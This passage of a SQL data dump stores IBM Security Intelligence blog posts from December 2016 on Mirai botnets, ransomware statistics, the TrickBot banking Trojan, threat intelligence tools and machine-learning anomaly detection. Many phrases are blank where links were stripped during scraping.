simplest brute-force attacks, and the outcome has been destructive. The first wave of weaponized IoT attacks, which leveraged the   to infect devices and force them to direct internet traffic to a given target, started in September 2016. At that time, a large telecommunications provider in France was hit by the botnet in a 620 Gbps DDoS attack. Next, a popular security researcher saw the Mirai malware leveraged against IoT devices to   in one of the “biggest assaults the internet ever witnessed.” In October 2016, Mirai hit again, this time causing Internet outages across the U.S. when its army of hijacked connected devices hit a major DNS service. In late   a German telecommunications provider suffered its own attack via infected routers. These cases gave Mirai and copycat   some real-world results that proved beyond a doubt that IoT threats are not baseless: They have already crossed the line into weaponization. The time to act is quickly running out. Mirai’s favorite flavors are consumers’ IoT devices such as Wi-Fi cameras, smart thermostats, modems, routers, CCTVs and DVRs. Unfortunately, IBM Security has found that only 10 percent of consumers think it’s important to protect home devices. With little to   for better security on the manufacturer’s end,   and a lack of consumer demand for security, 2017 will see a new norm in the generation of IoT DDoS attacks. Making matters worse, and reminiscent of historical cases where malware source code was intentionally leaked on the Internet, Mirai’s creator leaked its code on a hacking-related discussion board, ultimately unleashing it in the wild where other attackers can pick it up and use it in their own botnets. In 2016, a historic   were stolen by cybercriminals, including huge heists that affected the users of Yahoo!, LinkedIn and MySpace, to name a few. When organizations of this size are breached and up to   find their way into the  , the long-terms effects of an attack   and  . Businesses who fall prey to targeted attacks and breaches are having difficulty detecting them closer to real time.   found that it takes companies an average of   to find out about a breach, extending the window of opportunity during which attackers covertly reside in the breached systems and harvest more data. The more data stolen, the more customers are likely to be affected by the time the breach is discovered, resulting in   as well as customer turnover, diminished goodwill and brand loss. Often, response after breach discovery is slow because   don’t have formal incident response plans in place. But attacks don’t have to be as destructive and drawn out as they typically turn out to be. Breaches contained within a month cost $1 million less than those contained in more than 30 days. Moreover, the Ponemon study found that the majority of breach costs were related to response activities that must take place after a breach is discovered. These costs can be cut back as much as $400,000 when an adequate plan is in place. To minimize customer exposure, organizations can plan how to respond to cyberattacks. Making the response more effective and efficient can  , further reducing impact at a time where costs of handling an attack can easily exceed the initial damage. Cyberthreats are going to continue escalating next year. What stands true, beyond the intricacy of each threat category, is that   — whether on a personal, consumer or enterprise level — can considerably reduce the impact of any attack. The response plan that people and organizations have in place, along with the organized way every aspect is tackled, is what will eventually dial back the impact and monetary losses for organizations. Wishing us all a secure 2017!', '\'Advanced Threats\', \'Cybercrime\', \'IBM X-Force Research\', \'Incident Response (IR)\', \'Internet of Things (IoT)\', \'Ransomware\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/year-in-review-top-three-cybercrime-threats-of-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (150, 'Hacked for the Holidays: When You’re Asked to Fix the Family Computer', 'Pamela Cobb', '2016-12-19', 'Whether hanging stockings, lighting candles on a menorah or gathering for an  , if you are an IT professional visiting family this season, you will inevitably be asked to fix the family computer, tablet, smartphone or programmable thermostat while you’re there. As an introvert, I use the hour I might have to spend uninstalling browser toolbars and removing adware to recharge from the intensity of so many people crammed into one place. It’s my own little holiday within a holiday. However, I do wish I could leave my family with a list of things not to do on a computer or tablet. Fortunately, there’s enough combined internet security brainpower at IBM to create such a list. In fact, we have a handy printable version you can leave with your folks on your next visit. At its core, the advice boils down to increasing awareness of your digital surroundings. Here are some examples.     I wish my fellow IT professionals luck this holiday season. Personally, I hope I won’t have to fix the family computer again in 2017. I will, however, commit to fixing the adjustable thermostat, since I’m always the coldest one in the house. If you’d like to learn more about particular attack vectors, check out the many reports available from the  . And don’t forget to print the handy tips list above to leave with your family!', '\'Best Practices\', \'Cybersecurity\', \'Password\', \'Password Management\', \'Security Awareness\'', 'https://securityintelligence.com/hacked-for-the-holidays-when-youre-asked-to-fix-the-family-computer/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (151, '2016: The Year of the DDoS Attack', 'Domenico Raguseo', '2016-12-16', 'Some malware incidents will go down in history. The IT industry remembers 2006, for example, as the year of Stuxnet, an infamous worm that drew public attention to the insecurity of supervisory control and data acquisition (SCADA) and programmable logic controller (PLC) systems. I’m quite sure that 2016 will be similarly defined as the year of the  . DDoS isn’t new. In fact, it has been a common cybercriminal tool for decades. And although this type of attack took down many popular websites in 2016, that’s not why DDoS defined the year in cybersecurity. Rather, 2016 will go down as the year cybercriminals began incorporating the Internet of Things (IoT) into DDoS campaigns on a wide scale. This new breed of malware is designed to infect millions of   — not to damage them directly, but to create massive botnets through phishing campaigns, ransomware and other ploys. These botnets facilitated many high-profile attacks that knocked out several prominent websites this past year. The method is not entirely new, but the scale and success of these campaigns are quite impressive. Let’s look at it from the perspective of the owner of a device used to facilitate a DDoS attack. All kinds of connected devices, from cameras, smartphones and sensors to refrigerators, light fixtures and washing machines, are fair game. Many enterprises have proper   in place to protect their devices, but regular users, in general, are not as well-prepared. When shopping for a refrigerator, for example, consumers rarely consider what operating system it runs or whether it has a virtual private network (VPN). It is time for consumers and businesses to change this behavior for 2017. Users should educate themselves about the consequences of DDoS attacks and vendors should be held responsible for building effective security measures into their devices. Increased awareness is the key across the board.', '\'Connected Devices\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'Internet of Things (IoT)\'', 'https://securityintelligence.com/2016-the-year-of-the-ddos-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (152, 'Turn Scrap Paper Into Security Investigations With IBM X-Force Threat Intelligence', 'Security Intelligence Staff', '2016-12-15', 'According to a recent study from  , nearly one-third of organizations have trouble operationalizing threat intelligence despite the plethora of sources of threat data. Open standards have helped tremendously in the effort to incorporate threat intelligence into existing security solutions. In fact, over 50 vendors on the IBM X-Force Exchange are listed on the OASIS site as compatible with Structured Threat Information Expression (STIX) and Trusted Automated Exchange of Indicator Information (TAXII). Open standards, however, can’t fix the research needed on the front end to actually investigate an incident. One of the major outcomes of the research IBM conducted when preparing to launch the X-Force Exchange was the crystallized image of a pile of scrap paper with frantic scribblings on it. Results from random internet searches, snippets overheard at a lunch with colleagues and notes from other employees do not make a cohesive investigation. It became clear that all the external threat data in the world would not help solve any security problems if it couldn’t get from that scrap paper into a security tool to enact blocking or protective actions. Collections in the X-Force Exchange represent many things now, from private user investigations to formal X-Force advisories covering new vulnerabilities, malware campaigns and other significant concerns in the threat landscape. The Exchange has evolved to allow users to share reports on tactical observables, such as IP addresses, Domain Name Server (DNS) reports,   and malware file information. Users can also exchange human-generated context and related files with as wide a range of community as they’d like. \n Often when you start investigating a potential security issue, you start your journey with one observable, be it an IP or URL you saw in a spam email or in your   logs, as an entry down the rabbit hole. You might find other clues, such as malware file hashes affiliated with a host IP address or known exploits for a particular vulnerability, and follow those tracks. With the new Quick Collection feature on the X-Force Exchange, it’s easier to combine research findings into one collection. You can see your recently viewed reports and decide what’s worth adding to the collection and what’s not worth investigating further. You can create the collection from there and start working on a fresh one where all the relevant reports are already attached, then add details to fill in the gaps. Once created, you can continue working with the collection as usual and invite individual colleagues or peers to add insights. There’s also the ability to join a private group to engage in  . You can even share the collection publicly to pass on important findings with a broad audience or gain detailed insights from other researchers. On every page, there is a new folder/collection icon in the top right next to your profile image and the notification button. Clicking this icon will open a panel where you can view your recently visited reports. By clicking on the check box next to the reports, you can indicate what reports you want to add to the collection. Enter a name for the collection in the input field below and click the button labeled “Create.” After the collection is created, you will see the reports already attached. To try the new quick collection feature, visit the   and check out our on-demand webinar, “ ,” to learn more about applying threat intelligence to security investigations.', '\'Collaboration\', \'IBM X-Force Exchange\', \'Security Operations and Response\', \'Threat Intelligence\', \'Threat Sharing\', \'X-Force\', \'X-Force Features\'', 'https://securityintelligence.com/turn-scrap-paper-into-security-investigations-with-ibm-x-force-threat-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (153, 'Insider Threats, Industrial Sabotage and Game Theory, Part 3: Multiplayer Games', 'Kelly Ryver', '2016-12-15', 'Before multiplayer games can be understood even in the simplest of terms, a refresher on two-player games is necessary — specifically the components of collusion, cooperation and defection, which form the basis for multiplayer games in game theory. The   outlines this model.\n We’ll leave the mathematics behind multiplayer games to Ph.D. candidates, but we can safely assume that the probability of   becomes more complex as the number of players and possible outcomes for each game increase.\n Before we continue to examine multiplayer games, it may be helpful to review the simple game theory model used in economics for a two-player game. The model for a multiplayer game is best visualized using a matrix, similar to (but not exactly the same as) what mathematicians call matrix algebra:\n \n The above model seems simple enough, so let’s apply it to Round 1 of the model game to get an idea of what this type of   could look like:\n Based on the result of the first round, if the target result was not achieved, the players would continue to the next round by finding a new attack technique, developing a new attack strategy or varying their entry points into the target environment.\n So how does an environment protect itself against such a threat, and what can be done to solve these types of problems? Practice game theory by establishing a skilled team of ethical hackers and  . These individuals can be in-house employees or third-party experts, except for high-security environments, where outside consultants may not be allowed.\n Environments that are serious about building a threat program and accompanying threats models should consider building red, blue and black teams, as well as practicing scenarios by participating in  . Typically, red teams focus on offensive capability while blue teams concentrate on defensive capability. Black teams are involved in the complete scenario. While not all environments face threats great enough to necessitate a black team, every organization should at least have red and a blue teams.\n A handful of security firms employ ethical hackers, certified penetration testers and mathematical theorists to build the complex stochastic and probability models required to run simulated attack scenarios that produce usable results.', '\'Information Security\', \'Insider Threat\', \'Risk\', \'Risk Management\', \'Security Leadership\'', 'https://securityintelligence.com/insider-threats-industrial-sabotage-and-game-theory-part-3-multiplayer-games/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (154, 'Ransomware Report: Top Security Threat Expected to Continue Rising in 2017', 'Limor Kessem', '2016-12-14', 'Digital extortion by means of ransomware or a systems breach was one of the most prominent threats to consumers and businesses in 2016. It seems IBM Security’s   materialized quite excessively this past year. Ransomware is a generic name for a family of computer bugs programmed to lock up endpoints, such as PCs, servers or mobile devices, in various ways. Ransomware encrypts data on the endpoint or revokes access to the endpoint itself, then asks the victim to pay a ransom to regain control of the endpoint. A ransomware attack can affect an individual or organization anywhere in the world. In just the first three months of 2016, U.S. companies shelled out more than  . That’s a dramatic 771 percent increase from the   companies reportedly spent in all of 2015. Cybercriminals are spreading these threats to a growing number of people and organizations. According to  , the volume of spam quadrupled in the last 23 months. Even more worrying is the marked increase in ransomware attached to spam, the rate of which is up 6,000 percent. While the average ransomware attachment rate was 0.6 percent in 2015, it has boomed to nearly 40 percent in 2016. It is no surprise that the   and   have been issuing alerts about this threat. The FBI estimated that ransomware is on pace to become a   source of income for cybercriminals by the end of 2016, a number that is expected to continue to rise in 2017. In that regard,   that ransomware is one of the biggest online threats affecting consumers and businesses this year, and it is unlikely to slow down in the foreseeable future. What would you do if cybercriminals managed to infect your computer with malware and encrypt all your files? Would you be concerned about saved work? Would you lament the loss of irreplaceable pictures and videos? Would you pay to get them back? If so, how much are you willing to spend? The average fee demanded by ransomware is over $500, but it may cost up to five times that amount. What if a cybercrime gang breached a company server to steal all your organization’s intellectual property? What if all the computers in the hospital you manage were encrypted and held hostage? Would you pay? Attackers are counting on you to do just that. To provide a clearer view into the unrelenting losses to ransomware, IBM fielded a U.S.-based consumer and business research study to determine the value employees and business executives place on data, and gauge their awareness and knowledge about ransomware. The results are alarming: The survey showed an overall lack of awareness and preparedness in the face of the  . Consumers interviewed about ransomware provided some startling results. The targets of this highly prolific threat are all too often completely unaware of its existence. According to the IBM survey, only 1 in 3 consumers had ever heard of ransomware. Moreover, most were unlikely to take protective measures to avoid ransomware. When asked about the importance of data, the scenario became more realistic to the respondents. For example, 55 percent of parents would pay to recover precious memories, versus only 39 percent of nonparents. In terms of other files, most respondents balked at the idea of paying a cybercriminal for their data. Many indicated that if were to consider caving in to fraudsters’ demands, they would not pay more than $100 to recover important data. In reality, however, consumers often end up paying a lot more than they would imagine, since ransomware demands average at least five times that amount. On the  , the IBM survey found that most employees are unaware of what ransomware is or how it can affect their company. The survey results showed that both awareness and the perceived willingness to pay to recover data depended on business size and previous experience with similar attacks. \n Seventy percent of businesses previously hit by ransomware indicated that they had paid the ransom to recover company data. Of that portion, 50 percent paid over $10,000 and 20 percent paid over $40,000. Furthermore, 60 percent of business executives surveyed believed they would pay to recover data in the future. Depending on the type of data lost, they indicated they would be willing to pay between $20,000 and $50,000 to regain access. With ransomware, the question is still to pay or not to pay? The FBI and other law enforcement agencies have advised victims to  . Paying only encourages cybercriminals to continue spreading their malware and raking in cash. For more statistics and pointed advice to help you minimize the window of opportunity for a ransomware attack, download the full report, “ .”', '\'Advanced Threats\', \'IBM\', \'IBM Security\', \'IBM X-Force Research\', \'Malware\', \'Ransomware\', \'X-Force\'', 'https://securityintelligence.com/ransomware-top-security-threat-expected-to-continue-rising-in-2017/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (155, 'Nǐ Hǎo TrickBot? Dyre Successor Spreads to Asia', 'Limor Kessem', '2016-12-13', 'The   emerged in October 2016 as new banking malware, boasting a code that appears to have more than one feature in common with the Dyre Trojan. From its very early days, TrickBot already possessed the capability to launch  , and judging by its rapid development, IBM X-Force researchers believe it is poised to become a rising cybercrime threat in 2017. X-Force researchers following TrickBot’s evolution noted that the malware’s new configurations have recently expanded to include new targets in countries where TrickBot is already operating, such as Australia, the U.K., New Zealand and Germany. But beyond the existing geographies, TrickBot now deploys redirection attacks in Singapore, India and Malaysia. \n \n TrickBot is not the first malware to head for Singapore right after it hits English-speaking geographies. The small yet prosperous country has been seeing increasing interest from cybercrime gangs — especially Dridex, but also  , Neverquest and Tinba, to name a few, per IBM X-Force. Although it is primarily a Chinese-speaking country, the thriving growth of international business in Singapore is driving most organizations to also communicate in English. And since most malware campaigns are launched in English, cybercrime gangs don’t have to invest much into adapting their spam and tools in Singapore. Furthermore, the perpetual rise of multinational corporations conducting business in Singapore makes the region even riper for financial cyberattacks due to a constant rise in the type of high-value accounts. According to X-Force researchers, TrickBot focuses its attacks on business accounts, corporate and commercial banking, and wealth management across all targeted banks. \n \n TrickBot’s recent configurations also target commercial banks in India and Malaysia, which may mean that the gang is looking to create cash-out options in those countries, judging by its growing focus on the Asia-Pacific region. \n TrickBot’s operators are apparently working hard to create new redirection attacks for the malware. In the most recent configuration, the ratio of redirection attack in the configuration was adapted to 58 percent of the URLs targeted by the malware. In comparison, the previous configuration only featured redirections for 35 percent of the target URLs. \n \n If we compare TrickBot to other Trojans that deploy redirection attacks, we’ll see that Dridex has been gradually reducing the number of these attacks or removing them completely. The same applies to the GozNym Trojan, which reduced its redirection attack ratio to 12 percent and lower in some geographies, per X-Force analysis. The redirection technique became popular with banking Trojans in 2014, when the Dyre gang started using it to target banks, primarily in the U.K.,  , Australia and  . Although   in November 2015, the method itself continues to be a success factor for fraud attacks. For example, less than two months after Dyre disappeared, IBM Trusteer reported the   had launched redirection attacks in the U.K. Next, GozNym launched its own version of the redirection scheme in  . Most recently, TrickBot launched redirection attacks in November 2016 against a list of banks in the U.K. Redirection attacks can be very effective in tricking bank customers and facilitating online banking fraud. They are considered an advanced modus operandi because they are designed to bypass bank security measures by hijacking the victim to a malicious website before the victim ever reaches the bank’s site. Note that the bank’s website is not being compromised. Rather, clever attackers are creating convincing replicas of bank websites. They even include the bank’s URL and secure sockets layer (SSL) certificate, making it very hard for victims to visually detect any difference. The fraudulent sites are hosted on other servers where attackers can capture credentials and two-factor authentication data to take over the victim’s account. This attack is most often identified with the resources and capabilities of organized cybergangs that have in-house developers, such as the Dridex crew, because of the extra setup, preparation and maintenance of unique site replicas for each target. Banks wishing to protect their customers from evolving threats and cybercrime are invited to learn more about  . Additionally, read our   article for tips on protecting against malware like TrickBot and other banking Trojans and for staying safer on PC/mobile devices. IBM X-Force shares TrickBot indicators of compromise (IoCs) on  . Just type “TrickBot” into the search bar to find all related collections on this malware. Your team can add to TrickBot collections by anonymously sharing additional IoCs on X-Force Exchange, ultimately helping information security professionals fight cybercrime threats in real time, cutting malware’s lifelines.', '\'Advanced Threats\', \'Banking Trojan\', \'Dridex\', \'Dyre\', \'IBM X-Force Research\', \'Malware\', \'TrickBot\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/ni-hao-trickbot-dyre-successor-spreads-to-asia/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (156, 'With AI2, Machine Learning and Analysts Come Together to Impress, Part 2: The Algorithms', 'Brad Harris', '2016-12-12', 'AI2 is an “analyst-in-the-loop” system, meaning that it exploits the expertise of a security analyst to improve itself. A “human-in-the-loop” system is used to generate more supervised examples for the   stage to use in an iterative training algorithm. This is exactly what AI2 does, allowing feedback to make the machine gradually smarter in the security domain.\n According to the paper “ ,” the system consists of four components:\n According to the paper, the system mines logs from web servers and  . The web logs are to prevent web attacks while specifically indicating the use of firewall logs to stop data exfiltration. This is an interesting use case and is often difficult to detect. There are extremely sophisticated ways of exfiltrating data, many of which would not be noted in firewall logs. The use of covert channels can be nearly impossible to detect.\n It would be easy to extrapolate this system’s consumption of intrusion prevention system (IPS) logs or other log sources in addition to the logs described above. This would allow for the assistance of analysts in a more traditional configuration as well. As for sources of unknown attacks, IT managers could use a protocol decoding engine, which would allow other protocols to be monitored. This analysis could lead to a much more thorough attack discovery system. However, these are items for future work.\n The paper’s authors describe two metrics for their data: the size of the raw data set, which in this case over a three month period was 3.6 billion log lines, and the number of unique entities per day, which represents the number of unique IP addresses, users or sessions. The data here involves hundreds of thousands of unique users per day.\n The authors, using their domain knowledge, chose users as the analytical unique entity and computed 24 features on a daily basis from the user data. The design goals for the big data platform were to support the analysis of 10 million or more users and to be able to retrieve   for 50,000 entities at a time. A behavioral signature is the series of steps required to perform an attack and may involve several related variables.\n The big data system scales by first looking at the log streams, extracting the entities from it and then updating activity records, which are summaries of activities over a very short period of time. In the AI2 platform, the time window is one minute. Then the activity aggregator consolidates the activity records over a larger time window, such as a day. From this, the entity-feature matrix can be populated. The entity-feature matrix is exactly what it sounds like: a matrix with entities in one dimension, and a feature vector in the other. A novel way to accelerate performance is to keep activity records, which overlap (i.e., by the minute, hour, day and week). This reduces the number of records required to compute features for any arbitrary amount of time.\n The paper describes the ensemble use of three outlier detectors. Outlier detectors are, in this case, equivalent to unsupervised detectors. Outliers are representative of possible attacks in these algorithms. Note that ensemble unsupervised detectors are rare for two reasons.\n First, it is difficult to compare the answers given by two detectors because there is no consistent unit of measurement between many detectors. Some algorithms use the same distance metric, but even then, the relative scores are hard to compare. Second, there is no ground truth in the unsupervised case in general. The challenge is to determine just how confident one can be in the answer given by each unsupervised detector. Without ground truth, this is extremely problematic.\n The first detector the authors used was Principal Component Analysis (PCA), which is often used as a feature reduction technique, eliminating features that have a lower impact on the final outcome. This method is a matrix decomposition method that looks for significant differences in correlation between the decomposed matrix and the reconstruction of the input matrix using only the principal components. Choosing the first principal components (primary features) to deconstruct the matrix, then using only those components to attempt to reconstruct the matrix, creates a condition where the reconstruction error is low for the normal cases and high for the outliers. The authors used this reconstruction error as the outlier score for the PCA method.\n The authors also employed a replicator neural network (RNN), also known as an autoencoder. They used a feed-forward neural net that has three hidden layers, the second of which contains half as many neurons as the first and third, to create a nonlinear transformation of the data, which compresses the feature space. The network then decompresses it, creating a reconstruction. Just as with the PCA method, the reconstruction error is used as the outlier score. Just as in PCA, because the RNN was trained to minimize the reconstruction error, the higher error scores represent the outliers.\n Finally, the authors used a density-based algorithm. Density-based methods are usually clustering techniques. In this case, examples are used to form a multivariate joint probability distribution. Where probabilities are less dense, there are typically outliers — that is, high-density regions are typically representative of normal data, whereas low-density regions indicate abnormal data. Once again, this approach is driven by the observation that attacks are rare and, therefore, form low-density areas of the distribution. The outlier score is the probability density at a given point of the distribution.\n At a high level, the authors first trained the supervised and unsupervised components, evaluated a day’s worth of data, displayed highly scored outliers and then collected feedback from the analyst. They then repeated this procedure, each time training a new model for the next day. Because the system only displays a small fraction of the total number of events, the analyst can focus on what are hopefully events more likely to be attacks. Note that these outliers are not necessarily malicious, they are just different from the rest of the events. This is why analyst feedback is required. The results of this feedback are used to increase the amount of labeled data for a supervised model.\n The paper describes the potential benefit of categorizing attacks and, subsequently, creating different models per category. While this is interesting, the extra dependence on a category selection algorithm may introduce extra noise into the system, as the algorithm is bound to produce some errors. However, more specific, supervised models should produce better results with attack prediction.', '\'Cognitive Computing\', \'Cognitive Security\', \'Machine Learning\', \'Threat Detection\', \'Threat Intelligence\'', 'https://securityintelligence.com/with-ai2-machine-learning-and-analysts-come-together-to-impress-part-2-the-algorithms/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (157, 'Augmented Intelligence: Making the Case for Cognitive Security', 'Michael Ash', '2016-12-9', 'In a world full of threat actors, from cybercriminals to state-sponsored agencies, it’s clear that risks are increasing. The global cost of cybercrime is expected to  , a threefold increase from the 2015 estimate of $500 billion. As a result, securing data is becoming a more complex endeavor — one that can only be accomplished with the help of augmented intelligence. Over 2.5 quintillion bytes of data is generated every day worldwide, and 80 percent of it is unstructured. Humans alone simply can’t handle all that information. Organizations began with perimeter defense, which built a strong moat around data. However, the perimeter defense was eventually rendered inadequate as cybercrime techniques became more sophisticated. Companies began purchasing a variety of security products to counteract the risk. They used analytics from   systems to collect and assess the event data. But cybercriminals are well organized and well-funded. To stay ahead of the good guys, criminals on the Dark Web collaborated and shared techniques that led to cybercrime for hire. Augmented intelligence, or cognitive augmentation, is the answer. This technology elevates analysts’ performance by providing them with richly focused threat knowledge. It mitigates the shortage of skilled security analysts by increasing their effectiveness. Security analysts are limited to consuming a fraction of available threat data, while security systems are effective in consuming structured data from fully instrumented enterprises. Unfortunately, the vast amount of security content is both human-generated and  . The average organization captures over 17,000 malware alerts per day, and some are spending as much as $1.3 million responding to erroneous or inaccurate malware alerts, according to the Ponemon Institute report, “ .” Only 19 percent of malware alerts are considered reliable and just 4 percent are ever investigated. Additionally, the cost of breach and incident mitigation is daunting as companies continue to assess methods to augment the limited number of security personnel. The only way to digest, comprehend, analyze and leverage that much data is to utilize cognitive systems. The following number prove it:  is the strongest way to consume and prioritize a large collection of security data by providing predictive analytics. IBM is one of the first companies to offer this kind of capability with  . It is training a new generation of systems to understand, reason and learn about rapidly evolving security threats. Watson can quickly analyze and index research, web text, video and threat data at an unprecedented speed and scale. Watson does not replace the security analyst, but rather augments the analyst’s capability by providing analytics from datasets too large for human consumption. Understanding context and using reasoning, Watson provides insights into large security datasets, allowing it to become more proficient at proactively identifying risks. The following trends from IBM’s “ ” report demonstrated the need for this new paradigm: Companies must examine how to supercharge their existing security analysts by providing them access to focus analytics and threat research. Watson seeks hidden patterns in data and recognizes anomalous behaviors to expand its understanding of the global threat environment. It also produces rich contextual information key to threat detection and triage. The economics of cybercrime will change as this intelligent augmentation expands. Cybercriminals relying on obscurity in a vast array of event data are exposed earlier in the process. Cognitive security represents a huge leap forward, even in its infancy, with its ability to effectively leverage unstructured data to find complex patterns of anomalies. Watson can significantly shorten the timeline from alert to action by applying advanced data analytics and natural language processing. How is cognitive security any different than an experienced analyst with Google? The key is cognitive systems understand context and natural language. Watson can correlate unstructured security data from multiple language sources, whereas Google’s search engine does not understand context. For example, consider the search, “ .” The engine shows you plenty of cats as a result. Watson, however, understands natural language and can provide more powerful analytics. Its growth continues with instruction from IBM staff as well as faculty and students from eight universities. The system utilizes learning processes to generate suggestions, hypotheses and evidence-based recommendations. This capability will help address the current skills gap, accelerate threat identification and reduce the overall complexity of security analytics. The economics of cybercrime will be transformed as companies move from being reactive to proactive. Global security companies handle   from inside corporate firewalls. Cognitive systems like Watson consider threats in the wild and leverage the rich dataset from instrumented enterprises to drastically cut down on this noise. This capability will evolve, allowing for proactive threat alerting. For example, a specific exploit found in Eastern Europe is identified via a security alert, blog or event by a monitored system. Companies who combine the power of cognitive analytics with   would be alerted in advance so that they might implement preventative action before the threat materializes.  do not replace security analysts. Instead, they enable analysts to be more effective by providing contextual threat information. Applying cognitive systems to global threat datasets can reveal patterns so complex and nuanced that they are easily missed by an analyst. Interested in learning more about how IBM’s Watson and augmented intelligence are changing the threat landscape to stay ahead of the most advanced threats? Watch the “ ” Watson special and check out our video, “ ”', '\'Artificial Intelligence (AI)\', \'Cognitive Computing\', \'Cognitive Security\', \'Machine Learning\', \'Watson\'', 'https://securityintelligence.com/augmented-intelligence-making-the-case-for-cognitive-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (158, 'Save Time by Accessing Multiple Threat Intelligence Streams at Once', 'Doron Shiloach', '2016-12-8', 'We live in a world of information overload, where an incredible   are created every day. Humans can only process a fraction of that information. Security analysts, responsible for maintaining the security of the company for which they work, must meet specific requirements regarding the information they leverage in their investigations. It must be high-fidelity and delivered in real time with as much detailed context as possible — an increasingly difficult task given the multitude of information available. The IBM X-Force Exchange (XFE) platform was   to provide threat intelligence information openly, yet it was only one source of information. As vast as the X-Force data repository is, it became clear as the platform and threat intelligence market matured that we needed to provide a broader perspective to help analysts validate their findings. \n With that in mind, X-Force Exchange introduced an external threat feed manager to leverage partnerships with additional third-party threat intelligence providers within the platform. This service is designed to facilitate the processing of threat information, and make the analysis and investigation workflow simpler and more efficient. Much like a journalist looks for multiple news sources to corroborate or refute a story, a security analyst looks to multiple   sources to understand the relevance of a particular threat indicator. Many resources are available to provide the additional context needed for that investigation. First, there are connectors to the following open-source feeds: BotScout, PhishTank and VirusTotal. In addition, IBM has established partnerships with third-party feeds RiskIQ, ReversingLabs and RecordedFuture. These providers are now part of the   program. We intend to continue to add more partners in the coming months to provide even more options for our users. Some of these partners, such as RiskIQ, are already contributors to the IBM Security App Exchange. This extends the value of security solutions through predeveloped integration points for seamless protection to further collaborative defense. These partnerships allow existing customers of those providers to bring additional context when looking up an observable, such as an IP address, domain, vulnerability or malware, in the XFE report page. Specifically, when viewing a report, users will, as before, see the IBM X-Force section on the observable. For an IP address, this includes the risk rating and the historical information on that rating, the WHOIS address, malware context and passive Domain Name System (DNS) information. When the user authenticates the additional feeds, there will be further sections in the report that show the external providers’ information on that observable, which could include data such as Secure Sockets Layer (SSL) certificate intelligence, web components, host pairs and other proprietary analysis. With this simple development, the security analyst can now save time and avoid the inconvenience of visiting multiple sites or portals to investigate what the broader security ecosystem of   says about an observable. It will all be shown in a single pane in the XFE platform. Visit IBM X-Force Exchange to see the new feature in action, or check out our on-demand webinar, “ ,” to learn more about how to apply threat intelligence.', '\'IBM X-Force Exchange\', \'Threat Intelligence\', \'X-Force\', \'X-Force Features\'', 'https://securityintelligence.com/save-time-by-accessing-multiple-threat-intelligence-streams-at-once/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (159, 'Rising Attack Rates and Massive Breaches Plague Government Organizations', 'Michelle Alvarez', '2016-12-7', 'A government’s core role is to protect and enhance the lives of its citizens. It must deliver services to create and sustain a robust and efficient public infrastructure, ensure public safety, foster sustainable economic growth and build stronger communities. Those tasks bring many challenges, but the overriding requirement of security is common to them all. Without it, no government in the world can perform its role. Security is always a prerequisite.\n IBM’s “ ” reported that in 2015, the government sector advanced from sixth place to fourth place among most frequently attacked industries. According to the U.S. Government Accountability Office, cyberattacks against the U.S. government were   since 2006.\n Globally in 2015,   observed a 36 percent increase in security incidents affecting the average government client organization. A security incident — an attack or event that has been reviewed by security analysts and deemed worthy of deeper investigation — is the most serious of IBM MSS data classifications. That figure wasn’t as high as the 64 percent rise we observed in the average client company across all industries, but it was certainly significant.\n \n Coupled with reports of   in 2016, these findings underscored a need to draw attention to threats targeting governments. Most notably, over   containing Mexican voter data were exposed due to an improperly secured public-facing cloud database. Leaked data included names, parent names, voter identification numbers, addresses, dates of birth and other sensitive information.\n IBM Security found newer threats such as   plaguing government organizations. It also observed older, tried-and-true threats, such as SQL injection and buffer manipulation, still prevalent across incidents on government networks.\n \n These insights and more can be found in the recently released IBM Report, “ .”', '\'Federal Government\', \'Federal Government Security\', \'Government\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'X-Force\'', 'https://securityintelligence.com/rising-attack-rates-and-massive-breaches-plague-government-organizations/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (160, 'With AI2, Machine Learning and Analysts Come Together to Impress, Part 1: An Introduction', 'Brad Harris', '2016-12-5', 'is everywhere in the world of cybersecurity these days. It is often thought of as the magic bullet to secure systems and networks — a tool able to identify previously invisible attacks through a nontransparent set of functions, as in neural nets. Transparency aside, neural nets and other algorithms have indeed proven very effective. Security professionals run into a distinct problem when attempting to do this, however. Machine learning classifiers perform much better in the supervised case, where labeled data is available. Attack data is clearly distinguished from normal data and marked for training of the classifier. In this case, the classifier learns from the features of the training set to determine the differences between attack and normal examples. Features are typically variables that are either extracted directly or computed, depending on the data. They are usually identified by domain knowledge experts who carefully choose which variables make the most sense for the given challenge. One problem with supervised models is that attacks change. After enough time passes, the supervised models are no longer useful unless the chosen algorithm is designed to change over time with different-looking data. Another difficulty is class imbalance. There are many more normal examples than abnormal ones in a cybersecurity situation. Although attacks are relatively rare, the system is presented with a great deal of data that illustrates the nonmalicious case. There are literally dozens of these classification algorithms, including everything from simple decision trees to highly complex deep neural nets. But what happens in the real world where these labeled examples are not available? The ideal purpose of a machine learning algorithm is to create a situation where unknown attacks are identified and analysts are alerted. These systems are called anomaly detectors. The process requires a set of algorithms known as unsupervised learners and only works if there are commonalities among the features that can be used to group the data points. One way to do this is to assume that the training data is all nominal. That is, try to train the unsupervised algorithm in a situation where the noise from attacks is minimal. This allows the learner to group the normal data by the features extracted from the data set. These algorithms include representatives from simple k-means clustering to self-organizing maps and beyond. One huge problem with these algorithms is that they lead to  . This often means that their output is ignored because analysts 